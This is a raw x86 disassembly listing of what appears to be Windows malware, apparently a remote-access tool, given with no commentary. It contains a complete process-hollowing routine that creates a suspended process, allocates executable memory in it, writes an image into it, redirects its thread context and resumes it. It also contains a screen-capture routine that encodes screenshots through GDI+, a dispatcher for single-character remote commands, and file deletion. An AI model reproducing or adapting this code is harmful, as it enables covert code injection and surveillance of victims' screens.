lea eax [ ebp - 0x30 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
add esp 0x24
cmp esi 0x45
jne r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
pop esi
leave
retn 0x4
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_40e34b
add esp 0x20
sub_40e5af
mov eax sub_4126d0
call _EH_prolog
sub esp 0x70
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x74 ] eax
cmp [ eax ] 0x5a4d
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor al al
mov ebx [ eax + 0x3c ]
add ebx eax
mov [ ebp - 0x18 ] ebx
cmp [ ebx ] 0x4550
jne r-xdata
push 0x11
pop ecx
xor eax eax
lea edi [ ebp - 0x60 ]
[ edi ]
mov esi [ ebp + 0x10 ]
mov edi esi
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push esi
lea eax [ ebp - 0x60 ]
push eax
xor edi edi
push edi
push edi
push 0x4
push edi
push edi
push edi
push [ ebp + 0x8 ]
push edi
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
push 0x4
push 0x1000
push 0x4
push edi
call [ VirtualAlloc@IAT ]
mov edi eax
mov [ ebp - 0x70 ] edi
mov [ edi ] 0x10007
push edi
push [ esi + 0x4 ]
call [ GetThreadContext@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x4
lea eax [ ebp - 0x1c ]
push eax
mov eax [ edi + 0xa4 ]
add eax 0x8
push eax
push [ esi ]
call [ ReadProcessMemory@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
cmp eax [ ebx + 0x34 ]
jne r-xdata
push 0x40
push 0x3000
push [ ebx + 0x50 ]
push [ ebx + 0x34 ]
push [ esi ]
call [ VirtualAllocEx@IAT ]
mov [ ebp - 0x6c ] eax
test eax eax
je r-xdata
push eax
push [ esi ]
call [ ebp - 0x78 ]
push 0x0
push [ ebx + 0x54 ]
push [ ebp + 0xc ]
push eax
push [ esi ]
mov edi [ WriteProcessMemory@IAT ]
call edi
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x64 ] eax
push 0x0
push 0x4
lea eax [ ebx + 0x34 ]
push eax
mov eax [ ebp - 0x70 ]
mov eax [ eax + 0xa4 ]
add eax 0x8
push eax
push [ esi ]
call edi
test eax eax
je r-xdata
lea eax [ eax + eax * 4 ]
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x3c ]
lea eax [ edx + eax * 8 ]
lea eax [ eax + ecx + 0xf8 ]
mov [ ebp - 0x68 ] eax
push 0x0
push [ eax + 0x10 ]
mov edx [ eax + 0x14 ]
add edx ecx
push edx
mov eax [ eax + 0xc ]
add eax [ ebp - 0x6c ]
push eax
push [ esi ]
call edi
inc [ ebp - 0x64 ]
mov eax [ ebp - 0x64 ]
jmp r-xdata
mov ecx [ ebx + 0x28 ]
add ecx [ ebp - 0x6c ]
mov eax [ ebp - 0x70 ]
mov [ eax + 0xb0 ] ecx
push eax
push [ esi + 0x4 ]
call [ SetThreadContext@IAT ]
test eax eax
je r-xdata
movzx ecx [ ebx + 0x6 ]
cmp eax ecx
jge r-xdata
push [ esi + 0x4 ]
call [ ResumeThread@IAT ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_40e8a5
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
xor ebx ebx
push edi
push ebx
push ebx
push ebx
push r--data
call [ CreateDCA@IAT ]
mov edi eax
push edi
mov [ ebp - 0xc ] edi
call [ CreateCompatibleDC@IAT ]
mov esi [ GetDeviceCaps@IAT ]
push 0x8
push edi
mov [ ebp - 0x4 ] eax
call esi
push 0xa
push edi
mov [ ebp - 0x10 ] eax
call esi
mov esi eax
push esi
push [ ebp - 0x10 ]
push edi
call [ CreateCompatibleBitmap@IAT ]
cmp eax ebx
mov [ ebp - 0x8 ] eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call [ SelectObject@IAT ]
test eax eax
jne r-xdata
mov esi [ DeleteDC@IAT ]
push edi
call esi
push [ ebp - 0x4 ]
call esi
push ebx
call [ DeleteObject@IAT ]
lea eax [ ebp + 0xf ]
jmp r-xdata
push 0xcc0020
push esi
push [ ebp - 0x10 ]
push ebx
push ebx
push edi
push esi
push [ ebp - 0x10 ]
push ebx
push ebx
push [ ebp - 0x4 ]
call [ StretchBlt@IAT ]
test eax eax
jne r-xdata
push edi
mov edi [ DeleteDC@IAT ]
call edi
push [ ebp - 0x4 ]
call edi
push [ ebp - 0x8 ]
call [ DeleteObject@IAT ]
lea eax [ ebp + 0xf ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
cmp [ ebp + 0xc ] bl
mov edi [ DeleteObject@IAT ]
je r-xdata
push edi
mov edi [ DeleteDC@IAT ]
call edi
push [ ebp - 0x4 ]
call edi
push [ ebp - 0x8 ]
call [ DeleteObject@IAT ]
lea eax [ ebp + 0xf ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x80 ]
push eax
push 0x18
pop esi
push esi
push [ ebp - 0x8 ]
call [ GetObjectA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x54 ] 0x14
push eax
call [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x6e ]
push 0x1
imul eax [ ebp - 0x70 ]
pop edx
cmp ax dx
jne r-xdata
push [ ebp - 0xc ]
mov ebx [ DeleteDC@IAT ]
call ebx
push [ ebp - 0x4 ]
call ebx
push [ ebp - 0x8 ]
call edi
lea eax [ ebp + 0xf ]
jmp r-xdata
lea eax [ ebp - 0x68 ]
push eax
push [ ebp - 0x4c ]
call [ GetIconInfo@IAT ]
test eax eax
je r-xdata
push 0x4
pop ecx
cmp ax cx
ja r-xdata
mov [ ebp + 0xc ] edx
jmp r-xdata
push [ ebp - 0x58 ]
call edi
push [ ebp - 0x5c ]
call edi
mov eax [ ebp - 0x44 ]
push [ ebp - 0x4c ]
sub eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0x48 ]
sub eax [ ebp - 0x64 ]
push eax
push [ ebp - 0x4 ]
call [ DrawIcon@IAT ]
push 0x8
pop ecx
cmp ax cx
jbe r-xdata
mov [ ebp + 0xc ] ecx
jmp r-xdata
mov cl [ ebp + 0xc ]
shl edx cl
lea eax [ edx * 4 + 0x28 ]
push eax
jmp r-xdata
push 0x10
pop ecx
cmp ax cx
jbe r-xdata
push 0x40
call [ LocalAlloc@IAT ]
mov esi eax
mov ecx [ ebp + 0xc ]
cmp cx 0x18
mov [ esi ] 0x28
mov eax [ ebp - 0x7c ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x78 ]
mov [ esi + 0x8 ] eax
mov ax [ ebp - 0x70 ]
mov [ esi + 0xc ] ax
mov ax [ ebp - 0x6e ]
mov [ esi + 0xe ] ax
jae r-xdata
cmp ax si
ja r-xdata
mov eax [ esi + 0x4 ]
push 0x8
add eax 0x7
pop ecx
cdq
idiv ecx
movzx ecx [ ebp + 0xc ]
mov [ esi + 0x10 ] ebx
mov [ esi + 0x24 ] ebx
imul eax ecx
imul eax [ esi + 0x8 ]
push eax
push ebx
mov [ esi + 0x14 ] eax
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
jne r-xdata
push 0x1
pop eax
shl eax cl
mov [ esi + 0x20 ] eax
mov [ ebp + 0xc ] 0x20
mov [ ebp + 0xc ] esi
push 0x28
push ebx
push esi
push eax
movzx eax [ esi + 0x8 ]
push eax
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call [ GetDIBits@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc ]
mov esi [ DeleteDC@IAT ]
call esi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x8 ]
call edi
lea eax [ ebp + 0xf ]
jmp r-xdata
mov [ ebp - 0x20 ] 0x4d42
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x14 ]
lea eax [ ecx + eax * 4 ]
mov ecx [ esi ]
mov [ ebp - 0x1a ] bx
mov [ ebp - 0x18 ] bx
lea eax [ eax + ecx + 0xe ]
mov [ ebp - 0x1e ] eax
mov eax [ esi + 0x20 ]
mov ecx [ esi ]
lea eax [ ecx + eax * 4 + 0xe ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x16 ] eax
lea eax [ ebp + 0xf ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp + 0xf ]
lea ecx [ ebp - 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x20 ]
push 0xe
push eax
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push 0x28
push esi
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ esi + 0x14 ]
lea ecx [ ebp - 0x30 ]
push [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
lea eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
push [ ebp - 0x8 ]
call edi
push [ ebp - 0x10 ]
call [ GlobalFree@IAT ]
push [ ebp - 0xc ]
mov esi [ DeleteDC@IAT ]
call esi
push [ ebp - 0x4 ]
call esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ ebp - 0xc ]
mov esi [ DeleteDC@IAT ]
call esi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x8 ]
call edi
push [ ebp - 0x10 ]
call [ GlobalFree@IAT ]
lea eax [ ebp + 0xf ]
sub_40ec14
push ebp
mov ebp esp
sub esp 0xc
push ebx
lea eax [ ebp - 0x8 ]
push esi
push eax
lea eax [ ebp - 0xc ]
xor esi esi
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
call sub_40ecad
cmp [ ebp - 0x8 ] esi
pop ecx
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebp - 0x8 ]
call [ malloc@IAT ]
mov ebx eax
pop ecx
cmp ebx esi
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_40ecbd
add esp 0xc
cmp [ ebp - 0xc ] esi
mov [ ebp - 0x4 ] esi
jbe r-xdata
or esi 0xffffffff
lea esi [ ebx + 0x30 ]
mov esi [ ebp - 0x4 ]
push edi
imul esi esi 0x4c
mov edi [ ebp + 0xc ]
add esi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x4 ]
pop edi
jmp r-xdata
inc [ ebp - 0x4 ]
add esi 0x4c
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jb r-xdata
push ebx
call [ free@IAT ]
pop ecx
mov eax esi
push [ ebp + 0x8 ]
push [ esi ]
call [ wcscmp@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
sub_40ecd0
push ebp
mov ebp esp
sub esp 0xe8
movzx eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x40 ]
call sub_40ef83
lea eax [ ebp - 0x40 ]
push ebx
push eax
push rw-data
call GdiplusStartup
push [ ebp + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_40e8a5
pop ecx
pop ecx
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
test eax eax
jne r-xdata
push 0xc
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ rw-data ]
push ebx
push eax
lea ecx [ ebp - 0x50 ]
mov [ ebp + 0xc ] eax
call sub_40efa4
lea eax [ ebp - 0xa0 ]
push eax
push r--data
call sub_40ec14
pop ecx
mov esi r--data
pop ecx
lea edi [ ebp - 0x7c ]
push 0x1
pop eax
mov [ ebp - 0x80 ] eax
push ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x68 ] 0x4
mov [ ebp - 0x64 ] eax
call [ rw-data ]
mov esi eax
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0xa0 ]
push eax
push esi
lea ecx [ ebp - 0x50 ]
call sub_40f073
mov eax [ esi ]
lea ecx [ ebp - 0xe8 ]
push 0x1
push ecx
push esi
call [ eax + 0x30 ]
lea eax [ ebp + 0xb ]
lea ecx [ ebp - 0x24 ]
push eax
push ebx
push [ ebp - 0xe0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ esi ]
push ebx
xor eax eax
push ebx
push ebx
push eax
push esi
call [ ecx + 0x14 ]
mov edi [ esi ]
push ebx
push [ ebp - 0xe0 ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call [ edi + 0xc ]
mov eax [ ebp + 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
lea eax [ ebp - 0x30 ]
push 0xa
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
call [ _itoa@IAT ]
add esp 0xc
cmp [ rw-data ] 0x1
je r-xdata
cmp [ rw-data ] ebx
mov ebx rw-data
jne r-xdata
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x50 ]
call sub_40f003
cmp [ rw-data ] ebx
jne r-xdata
sub esp 0x10
mov ecx esp
push rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x4e
mov ecx ebx
call sub_402062
jmp r-xdata
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
sub esp 0x10
lea eax [ ebp - 0x24 ]
mov esi esp
push eax
lea eax [ ebp - 0x30 ]
push rw-data
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx rw-data
push 0x4d
call sub_402062
lea ecx [ ebp - 0x60 ]
mov ebx rw-data
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
push sub_40f0c5
mov ecx ebx
call sub_4020b8
sub esp 0x10
mov eax rw-data
mov esi esp
lea ecx [ ebp - 0x24 ]
push rw-data
push eax
push ecx
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x90 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push esi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
mov ecx ebx
push 0x10
call sub_402062
lea ecx [ ebp - 0x40 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x90 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x60 ]
jmp r-xdata
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_40efa4
push ebp
mov ebp esp
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
lea eax [ esi + 0x4 ]
mov [ esi ] r--data
push eax
push [ ebp + 0x8 ]
je r-xdata
call GdipLoadImageFromStream
call GdipLoadImageFromStreamICM
jmp r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40efd7
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_40f003
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_40eff6
pop ecx
sub_40f012
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipCloneImage
push eax
mov ecx esi
call sub_40f05e
push 0x10
call sub_40f051
test eax eax
pop ecx
je r-xdata
xor eax eax
push [ esi + 0x8 ]
mov ecx eax
push [ ebp - 0x4 ]
call sub_40f097
jmp r-xdata
pop esi
leave
retn
sub_40f073
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi + 0x4 ]
call GdipSaveImageToStream
push eax
mov ecx esi
call sub_40f05e
pop esi
pop ebp
retn 0xc
sub_40f097
push ebp
mov ebp esp
push esi
mov esi ecx
push [ ebp + 0x8 ]
mov [ esi ] r--data
call sub_40f0b8
mov eax [ ebp + 0xc ]
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
retn 0x8
sub_40f0c5
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
xor ebx ebx
push edi
push ebx
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov al [ eax ]
lea ecx [ ebp + 0xc ]
mov [ ebp - 0x1 ] al
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
push [ eax ]
lea eax [ ebp - 0x20 ]
push 0x1
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
mov al [ ebp - 0x1 ]
cmp al 0x30
jne r-xdata
cmp al 0x31
jne r-xdata
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov al [ eax ]
push 0x1
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x8 ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] bl
setne al
push eax
push [ ebp - 0x8 ]
call sub_40ecd0
jmp r-xdata
cmp al 0x32
jne r-xdata
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov si [ eax ]
push 0x2
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] bl
push 0x3
lea ecx [ ebp - 0x20 ]
setne al
mov [ ebp - 0x10 ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] bl
push 0x4
lea ecx [ ebp - 0x20 ]
setne al
mov [ ebp - 0xc ] al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] bl
setne al
mov [ ebp - 0x8 ] al
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push esi
call sub_40f7bd
add esp 0x10
jmp r-xdata
pop ecx
pop ecx
cmp al 0x33
jne r-xdata
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push 0x4
lea ecx [ ebp - 0x20 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push 0x8
lea ecx [ ebp - 0x20 ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push [ eax ]
push [ edi ]
push [ esi ]
call sub_40f6d7
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
cmp al 0x34
jne r-xdata
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push 0x4
lea ecx [ ebp - 0x20 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push 0x8
lea ecx [ ebp - 0x20 ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push [ eax ]
push [ edi ]
push [ esi ]
call sub_40f72e
jmp r-xdata
push ebx
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push 0x4
lea ecx [ ebp - 0x20 ]
mov esi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
push [ eax ]
push [ esi ]
call sub_40f785
add esp 0xc
jmp r-xdata
sub_40f234
push ebp
mov ebp esp
sub esp 0x484
push esi
lea eax [ ebp - 0x1 ]
push r--data
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x44 ]
push eax
call sub_40e8a5
xor esi esi
pop ecx
cmp [ rw-data ] esi
pop ecx
jne r-xdata
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ rw-data ]
push esi
push eax
lea ecx [ ebp - 0x64 ]
call sub_40efa4
lea eax [ ebp - 0x74 ]
push eax
push r--data
call sub_40ec14
pop ecx
lea eax [ ebp - 0x74 ]
pop ecx
push esi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_40f40b
push 0x1b
mov ecx rw-data
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] 0x1
jne r-xdata
push 0xc
push r--data
call [ LoadLibraryA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
lea ecx [ ebp - 0x64 ]
call sub_40f003
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop esi
leave
retn
lea eax [ ebp + 0xf ]
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
je r-xdata
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ DeleteFileW@IAT ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
mov ecx esi
